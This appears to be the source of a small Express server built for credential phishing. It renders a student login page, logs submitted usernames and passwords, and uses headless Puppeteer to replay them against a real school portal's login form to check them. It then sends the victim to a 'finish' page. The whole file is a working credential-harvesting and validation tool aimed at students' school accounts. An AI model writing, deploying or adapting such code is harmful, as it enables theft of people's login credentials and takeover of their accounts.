const express = require('express');
const puppeteer = require('puppeteer');
const nodemailer = require('nodemailer');

const app = express();

app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded());
app.set('view engine', 'ejs');


const PORT = process.env.PORT || 3000;

app.get('/',(req,res)=>{
    res.redirect('/eleve');
});

app.get('/eleve',(req,res)=>{
    res.render('eleve2');
});

app.get('/auth',(req,res)=>{
    res.render('finish');
});

app.post('/',(req,res)=>{ 
    console.log(req.body);    
    (async () => {
        const browser = await puppeteer.launch({
            headless:true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
              ],//ok
        });
        // okok
        const page = await browser.newPage();

        await page.goto('https://vs.ecolejeanninemanuel.net/eleve.html');

        await page.waitForSelector('#id_50');
        await page.waitForSelector('#id_51');

        await page.type('#id_50',req.body.username);
        await page.type('#id_51',req.body.password);

        await page.click('#id_39');

        await await page.waitFor(4000);
        if (await page.$('#id_118id_64') !== null) res.redirect('/auth');
        else res.send('wrong password or username');
          

        // await browser.close();
    })();
})

app.listen(PORT,()=>{
    console.log(`Server listening on port ${PORT}...`);
});